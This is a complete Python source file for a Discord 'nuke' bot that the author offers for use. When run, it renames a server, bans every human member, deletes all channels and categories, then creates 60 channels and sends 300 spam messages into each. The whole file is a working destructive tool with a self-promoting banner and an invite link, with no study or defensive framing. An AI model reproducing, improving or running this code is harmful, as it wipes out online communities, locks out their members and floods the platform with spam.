import colorama
from colorama import Fore
import discord
import os
import sys
import json
import asyncio
import aiohttp
from discord.ext import commands

red = "\033[91m"
yellow = "\033[93m"
green = "\033[92m"
blue = "\033[36m"
pretty = "\033[95m"
magenta = "\033[35m"
lightblue = "\033[94m"
cyan = "\033[96m"
gray = "\033[37m"
reset = "\033[0m"
pink = "\033[95m"
dark_green = "\033[92m"
yellow_bg = "\033[43m"
clear_line = "\033[K"

def load_config(config_file_path):
    """Load the bot configuration from the config.json file."""
    try:
        with open(config_file_path, 'r') as config_file:
            return json.load(config_file)
    except FileNotFoundError:
        print("Error: config.json file not found.")
        sys.exit(1)
    except json.JSONDecodeError as e:
        print(f"Error parsing config.json: {e}")
        sys.exit(1)

def load_status(status_file_path):
    """Load the bot's status (activity) from the status.json file."""
    if os.path.exists(status_file_path):
        with open(status_file_path, "r") as f:
            return json.load(f)
    else:
        return {"activity": {"type": "playing", "name": "nothing"}}  

if __name__ == "__main__":
    config_file_path = "config.json"
    status_file_path = "status.json"

    config = load_config(config_file_path)
    status = load_status(status_file_path)

PREFIX = config.get('Prefix')
TOKEN = config.get('Token')
GUILD_NAME = config.get('Guild_Name')
CHANNEL_NAME = config.get('Channel_Name')
SPAM_MESSAGE = config.get('Spam_Message')
ICON_URL = config.get('Icon_URL')  
BAN_REASON = config.get('Ban_Reason', "Server Nuke") 
stream_name = config.get('Stream_Name')  
stream_url = config.get('Stream_URL') 

os.system("cls")

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    """Event handler when the bot is ready."""
    print(f'''{Fore.MAGENTA}

 /$$   /$$ /$$    /$$ /$$$$$$$$
| $$  / $$| $$   | $$|_____ $$ 
|  $$/ $$/| $$   | $$     /$$/ 
 \  $$$$/ |  $$ / $$/    /$$/  
  >$$  $$  \  $$ $$/    /$$/   
 /$$/\  $$  \  $$$/    /$$/    
| $$  \ $$   \  $/    /$$$$$$$$
|__/  |__/    \_/    |________/
                               
{Fore.WHITE}+. Raditz Nuke Bot ! <<<
{Fore.WHITE}+. Details:- <<<
{Fore.WHITE}+. Prefix:- {Fore.MAGENTA}"{PREFIX}" {Fore.WHITE}<<<
{Fore.WHITE}+. Username:- {Fore.MAGENTA}"@{bot.user.name}", {Fore.WHITE}<<<
{Fore.WHITE}+. ID:- {Fore.MAGENTA}"{bot.user.id}", {Fore.WHITE}<<<
{Fore.WHITE}+. API MS:- {Fore.MAGENTA}"{bot.latency * 1000:.2f}ms", {Fore.WHITE}<<<
{Fore.WHITE}+. Made By:- {Fore.MAGENTA}"@divyansh.dll", {Fore.WHITE}<<<
{Fore.WHITE}+. Stream Name:- {Fore.MAGENTA}"{stream_name}", {Fore.WHITE}<<<
{Fore.WHITE}+. Stream Url:- {Fore.MAGENTA}"{stream_url}", {Fore.WHITE}<<<
{Fore.WHITE}+. Discord:- {Fore.MAGENTA}"https://discord.gg/XftwHE4A", {Fore.WHITE}<<<
''')

    try:
        activity = discord.Activity(
            type=discord.ActivityType.streaming,
            name=stream_name,
            url=stream_url
        )

        await bot.change_presence(activity=activity)
        print(f"")

    except Exception as e:
        print(f"Error setting streaming status: {e}")

@bot.command()
async def nuke(ctx):
    """Command to rename the server, delete categories and channels, spam messages, ban members, and update server icon."""
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You do not have permission to nuke the server.")
        return
    
    guild = ctx.guild
    if guild:
        try:
            await guild.edit(name=GUILD_NAME)
            print(f'Server renamed to: {GUILD_NAME}')
            
            if ICON_URL:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(ICON_URL) as response:
                            if response.status == 200:
                                icon_data = await response.read()
                                await guild.edit(icon=icon_data)
                                print(f"Server icon updated successfully!")
                            else:
                                print(f"Failed to fetch the image from URL: {ICON_URL}")
                except Exception as e:
                    print(f"Error changing server icon: {e}")

            for member in guild.members:
                if not member.bot: 
                    try:
                        await member.ban(reason=BAN_REASON)
                        print(f"Banned {member.name}#{member.discriminator} for reason: {BAN_REASON}")
                    except discord.Forbidden:
                        print(f"Permission error: Can't ban {member.name}#{member.discriminator}")
                    except discord.HTTPException as e:
                        print(f"HTTP error while banning {member.name}: {e}")

            delete_category_tasks = []
            for category in guild.categories:
                delete_category_tasks.append(delete_category(category))
            
            delete_uncategorized_channels_task = delete_uncategorized_channels(guild)
            await asyncio.gather(*delete_category_tasks, delete_uncategorized_channels_task)

            created_channels = await create_channels(guild)

            spam_tasks = [spam_messages(channel) for channel in created_channels]
            await asyncio.gather(*spam_tasks)

        except discord.errors.Forbidden:
            print('Permission error: The bot does not have enough permissions to perform this action.')
            await ctx.send("**`-` I don't have the necessary permissions to perform the nuke operation.**")
        except discord.errors.HTTPException as e:
            print(f'HTTP error occurred: {e}')
            await ctx.send("An HTTP error occurred during the nuke operation.")
        except Exception as e:
            print(f'Error during nuke operation: {e}')
            await ctx.send("An unexpected error occurred while trying to nuke the server.")
    else:
        await ctx.send("Guild not found. Please check the guild name.")

async def delete_category(category):
    """Delete all channels in a category and then delete the category itself."""
    try:
        delete_channel_tasks = [channel.delete() for channel in category.channels]
        await asyncio.gather(*delete_channel_tasks)
        await category.delete()
        print(f'Deleted category: {category.name}')
    except discord.errors.Forbidden:
        print(f'Forbidden: Bot doesn\'t have permission to delete category {category.name}')
    except discord.errors.HTTPException as e:
        print(f'HTTP error while deleting category {category.name}: {e}')

async def delete_uncategorized_channels(guild):
    """Delete uncategorized text and voice channels."""
    try:
        uncategorized_channels = [
            channel.delete() for channel in guild.channels if channel.category is None
        ]
        await asyncio.gather(*uncategorized_channels)
        print('Deleted uncategorized channels.')
    except discord.errors.Forbidden:
        print('Forbidden: Bot doesn\'t have permission to delete uncategorized channels')
    except discord.errors.HTTPException as e:
        print(f'HTTP error while deleting uncategorized channels: {e}')

import asyncio

async def create_channels(guild):
    """Create 60 channels concurrently without delay to maximize speed."""
    create_channel_tasks = [guild.create_text_channel(CHANNEL_NAME) for _ in range(60)]

    try:
        created_channels = await asyncio.gather(*create_channel_tasks)
        print(f'Created {len(created_channels)} channels.')
        return created_channels
    except discord.errors.Forbidden:
        print('Forbidden: Bot doesn\'t have permission to create channels.')
    except discord.errors.HTTPException as e:
        print(f'HTTP error occurred while creating channels: {e}')
        return []


async def spam_messages(channel):
    """Spam messages in a channel."""
    try:
        tasks = [channel.send(SPAM_MESSAGE) for _ in range(300)]
        await asyncio.gather(*tasks)
        print(f'Spammed messages in {channel.name}')
    except discord.errors.Forbidden:
        print(f'Forbidden: Bot doesn\'t have permission to send messages in {channel.name}')
    except discord.errors.HTTPException as e:
        print(f'HTTP error while sending messages in {channel.name}: {e}')

bot.run(TOKEN)
